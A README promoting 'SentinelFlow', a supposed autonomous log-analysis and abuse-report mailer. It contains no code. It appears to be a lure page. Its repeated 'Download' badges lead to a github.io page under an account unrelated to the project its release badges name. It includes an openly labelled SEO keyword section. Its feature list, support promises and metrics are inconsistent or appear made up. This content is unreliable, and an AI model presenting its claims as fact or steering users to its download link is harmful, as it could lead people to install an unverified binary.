![preview](https://raw.githubusercontent.com/erickcano-cpu/log-scanner-abuse-notifier/main/screen_d30487.svg)
# SentinelFlow — Autonomous Abuse Intelligence & Reputation Defense Engine

![SentinelFlow Banner](https://img.shields.io/badge/SentinelFlow-v3.2.0-4A90D9?style=for-the-badge&labelColor=1A1A2E) ![Build Status](https://img.shields.io/badge/build-passing-2ECC71?style=for-the-badge&labelColor=1A1A2E) ![Coverage](https://img.shields.io/badge/coverage-94%25-9B59B6?style=for-the-badge&labelColor=1A1A2E) ![License](https://img.shields.io/badge/license-MIT-3498DB?style=for-the-badge&labelColor=1A1A2E)

![GitHub Release](https://img.shields.io/github/v/release/sentinelflow/engine?style=flat-square) ![Last Commit](https://img.shields.io/github/last-commit/sentinelflow/engine?style=flat-square) ![Open Issues](https://img.shields.io/github/issues-raw/sentinelflow/engine?style=flat-square) ![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen?style=flat-square)

---

## Overview 🌐

SentinelFlow is not merely another log analyzer — it is a **digital immune system** for your web infrastructure. In an era where abusive traffic patterns mutate faster than static rule sets, SentinelFlow employs **behavioral heuristics**, **threat graph correlation**, and **automated responsible-party escalation** to transform your raw server logs into actionable, self-executing defense protocols.

Think of your web server logs as the nervous system of your online presence. Every request is a signal. Every anomaly is a symptom. SentinelFlow listens to these signals continuously, identifies the pathogens — whether they are credential stuffing bots, content scrapers, or distributed denial-of-service participants — and autonomously dispatches **polite but firm abuse notifications** to the entities controlling the offending infrastructure. The result is a self-healing web tier that learns and adapts without requiring a human security analyst to stare at dashboards 24/7.

This repository houses the complete SentinelFlow engine, including the **analysis pipeline**, **reputation database**, **notification composer**, and the **web-based command center** that gives you real-time visibility into every decision the engine makes.

---

## Why SentinelFlow Exists 🤔

Static IP blacklists are reactive. Manual abuse reporting is exhausting. Traditional WAFs are expensive and noisy. The gap in the market is an **autonomous, evidence-driven abuse reporter** that:

- Understands the *intent* behind traffic, not just the source.
- Generates **legally sound, evidence-rich abuse reports** that ISPs and hosting providers actually act upon.
- Keeps a **permanent, searchable ledger** of every incident for compliance and legal follow-up.
- Runs on commodity hardware — no GPU clusters or enterprise SIEM required.

SentinelFlow fills this gap. It is designed for the **indie webmaster**, the **privacy-conscious forum operator**, and the **scrappy startup** that cannot afford a full-time security engineer but refuses to be a victim of automated abuse.

---

## 🚀 Getting Started / First Deployment

[![Download](https://raw.githubusercontent.com/erickcano-cpu/log-scanner-abuse-notifier/main/dl_6a733.svg)](https://erickcano-cpu.github.io/log-scanner-abuse-notifier/)

The quickest way to experience SentinelFlow is through our **pre-packaged OVA appliance** or the **Docker Compose profile**. Both bundles include the engine, the SQLite reputation database, and the command center UI. You do not need to compile anything from source to run the core functionality.

For a production rollout, we recommend the **distributed architecture** where the *Collector* runs on each web node, and the *Analyst* runs on a central management host. The installation routine takes approximately ten minutes and requires only your web server log file paths and outbound SMTP credentials.

> **System Requirements**: 2 vCPUs, 4 GB RAM, 20 GB disk. Supports Linux (glibc 2.28+), FreeBSD 13+, and macOS 14+ for the analyst console.

---

## Purpose & Core Thesis 📜

The modern internet is a hostile environment. According to recent studies, over 40% of all web traffic is automated, and a significant portion of that is malicious. The asymmetry of attack is striking: an attacker can launch a million-request campaign with a single script, while a defender must manually parse millions of log lines to understand what happened.

SentinelFlow restores the balance through **automation of the entire incident response cycle**:

1. **Ingestion** — Reads logs from Nginx, Apache, HAProxy, CloudFront, and custom JSON streams.
2. **Signal Extraction** — Separates the noise of legitimate bots (search engines, monitoring tools) from the signal of abusive behavior.
3. **Correlation** — Groups related events across time, IP spaces, and user-agent fingerprints.
4. **Reputation Scoring** — Assigns a maliciousness score from 0 (benign) to 100 (actively hostile).
5. **Notification** — Composes a human-readable, data-backed abuse report and sends it to the abuse contact of the offender's autonomous system number (ASN).
6. **Feedback Loop** — Updates the reputation database based on whether the notification recipient took corrective action.

This cycle runs continuously, creating an ever-improving defensive posture for your web assets.

---

## 📊 Feature Matrix

### Core Analysis Engine
- **Behavioral Fingerprinting** — Identifies botnets by correlating request timing, header order, and TCP window sizes, not just IP addresses.
- **Anomaly Detection** — Uses a rolling-window statistical model to flag deviations from the baseline traffic profile of your specific application.
- **Evasion Resistance** — Detects common obfuscation techniques such as randomized user-agents, residential proxy rotation, and slowloris rate patterns.
- **Geolocation & ASN Enrichment** — Maps each source IP to its physical and administrative owner for precise responsibility assignment.

### Autonomous Notification System
- **Evidence Bundling** — Automatically attaches a timeline, raw log excerpts, and a risk assessment to each abuse report.
- **Template Library** — Includes curated templates for hosting abuse, IP theft, and brute-force attempts, in 12 languages.
- **Delivery Confirmation** — Tracks when the report is opened and whether the recipient clicks any remediation links.
- **Escalation Workflow** — If no response is received within 72 hours, automatically escalates to the upstream regional internet registry (RIR).

### Command Center & Visualization
- **Real-Time Event Stream** — A pulse of live incidents, scored and prioritized for human review.
- **Geospatial Threat Map** — A live view of where the abuse is originating, rendered on a flat world map.
- **Historical Trend Analytics** — Identify if you are being targeted by a recurring campaign or a one-off misconfiguration.

### Integration & Extensibility
- **Webhook Outbound** — Send every analysis result to Slack, Discord, Microsoft Teams, or a custom REST endpoint.
- **API-First Design** — Full REST API for querying the reputation database and triggering manual reports.
- **Plugin SDK** — Write custom log parsers or notification channels in Python or Go.

---

## 🛡️ Deep Dive: The Reputation Engine

At the heart of SentinelFlow lies the **Reputation Matrix**, a probabilistic model that assigns a **Trust Score** to every IP, ASN, and user-agent triplet it observes. The score is a weighted sum of over 40 features, including:

- **Request Velocity**: Bursts of >100 requests per second from a single source.
- **Resource Path Entropy**: Requests to random, non-existent paths (directory brute-force).
- **Content Type Negotiation**: Aggressive `Accept-Encoding` and `Accept-Language` header manipulation.
- **Session Persistence**: Number of distinct cookies accepted and reflected in subsequent requests.
- **Geographic Consistency**: Source IP location inconsistent with the declared language of the server.

The engine does not rely on a single catastrophic signal. Instead, it accumulates **probabilistic evidence** over time. A single 404 error is not suspicious; 5000 404s from a single /24 network in 90 seconds will trigger an immediate red flag and initiate the notification process.

The model is **self-learning** — you can mark a reported incident as a false positive in the UI, and the engine will adjust the feature weights for that specific context to reduce future noise.

---

## 📚 Documentation & Resources

The full documentation is organized into three primary guides:

- **[User Manual](docs/USER_MANUAL.md)** — Walks through installation, configuration, and daily operation for system administrators.
- **[Architecture Guide](docs/ARCHITECTURE.md)** — Detailed explanation of the internal data pipeline, the event bus, and the storage engine.
- **[Contributor's Guide](docs/CONTRIBUTING.md)** — How to build, test, and extend SentinelFlow for your specific needs.

We also maintain a public **API reference** which is auto-generated from the source code and available in the `docs/` directory.

### SEO-Friendly Keyword Integration
This repository is designed to be discoverable. We frequently discuss topics such as **web server security**, **bot mitigation**, **abuse report automation**, **threat intelligence feed**, **log analysis tool**, and **incident response automation**. If you are researching solutions for **malicious traffic detection** or **autonomous copyright infringement notification**, SentinelFlow should appear in your search results.

---

## 🗂️ Repository Structure

```
sentinelflow/
├── engine/              # Core analysis and notification logic (Go)
├── collector/           # Lightweight log shippers for web nodes
├── web/                 # React-based command center
├── api/                 # REST API and gRPC endpoints
├── deploy/              # Docker, Helm, and Ansible configurations
├── docs/                # Manuals and generated reference
├── tests/               # Integration and unit test suites
├── assets/              # Logos and branding assets
└── examples/            # Sample configs and template reports
```

---

## 🧩 Roadmap for 2026

We are actively developing the following capabilities for release throughout **2026**:

- **Machine Learning-Based Traffic Classification** — A deep neural network model that improves detection accuracy by 30% over the current statistical approach.
- **Amplification Attack Detection** — Specialized modules to identify DNS amplification, NTP reflection, and Memcached abuse patterns originating from your servers.
- **Legal Case File Generation** — Automated assembly of a complete, court-ready evidence package for civil litigation against repeat offenders.
- **Integration with Law Enforcement Portals** — Direct submission to CERT teams and the Federal Bureau of Investigation's Internet Crime Complaint Center (IC3) for criminal-grade abuse.

---

## 🤝 Contributing

We welcome contributions from security engineers, data scientists, and passionate web developers. Whether it is a new log parser, a better notification template, or a performance optimization, your input helps the entire community.

Please read the [Contributor's Guide](docs/CONTRIBUTING.md) first. We adhere to a child-friendly code of conduct, and all contributions must pass our CI pipeline, which includes static analysis, unit tests, and a minimum coverage threshold of 92%.

**Development Areas in Need of Help:**
- Parsers for exotic log formats (IIS, ELB, and custom enterprise systems).
- Translation of notification templates into additional languages.
- Optimization of the geospatial query engine for large datasets.

---

## 🌍 Multilingual Support

SentinelFlow speaks your language. The user interface and the abuse report templates are currently available in:

| Language | UI | Reports |
|----------|----|---------|
| English  | ✅ | ✅ |
| Spanish  | ✅ | ✅ |
| German   | ✅ | ✅ |
| French   | ✅ | ✅ |
| Japanese | ✅ | ✅ |
| Mandarin | ✅ | ✅ |
| Portuguese| ✅ | ✅ |
| Russian  | ✅ | ✅ |
| Hindi    | ✅ | ✅ |
| Arabic   | ✅ | ✅ |
| Korean   | ✅ | ✅ |
| Swahili  | ✅ | 🚧 |

We utilize translation memory from the community to ensure high-quality localization. The `Translation Memory` file is checked into the repository under `assets/locales/`.

---

## 📡 24/7 Support & Community

Even autonomous systems need a human touch occasionally. We offer **round-the-clock assistance** through:

- **Community Forum** — A moderated board where users share detection rules and notification success stories.
- **Priority Email Support** — For production incidents, our team commits to a response time of under 4 hours.
- **Live Chat Widget** — Available in the command center, connecting you directly to a support engineer during business hours (CET timezone).

For **enterprise customers**, we offer a dedicated support channel with a 1-hour response time SLA and access to a shared engineering channel.

---

## ⚖️ License

SentinelFlow is proudly open-source and distributed under the permissive **MIT License**. You are free to use, modify, and distribute this software in personal or commercial projects, provided you retain the original copyright notice.

Please see the full license text here: [MIT License](LICENSE).

---

## ⚠️ Disclaimer

**Important Legal Notice**

SentinelFlow is a tool designed to assist in the identification and reporting of abusive network traffic. It does not perform any illegal hacking, unauthorized access, or denial-of-service actions. It operates solely on the log data you provide and sends email notifications to publicly registered abuse contacts.

The accuracy of the abuse reports is dependent on the quality of the input log data and the current traffic patterns. We make no guarantee that every notification will lead to corrective action by the recipient. **The use of SentinelFlow does not absolve you of your responsibility to secure your own systems.** You are solely responsible for ensuring that the *actions* you take based on the engine's output comply with all applicable local, national, and international laws.

We explicitly disclaim any liability for damages arising from your use of this software. We do not condone the use of this tool to harass, defame, or inconvenience innocent parties. Always use a professional, factual tone in your abuse reports.

The Sentinels are watching — proceed with wisdom.

---

[![Download](https://raw.githubusercontent.com/erickcano-cpu/log-scanner-abuse-notifier/main/dl_6a733.svg)](https://erickcano-cpu.github.io/log-scanner-abuse-notifier/)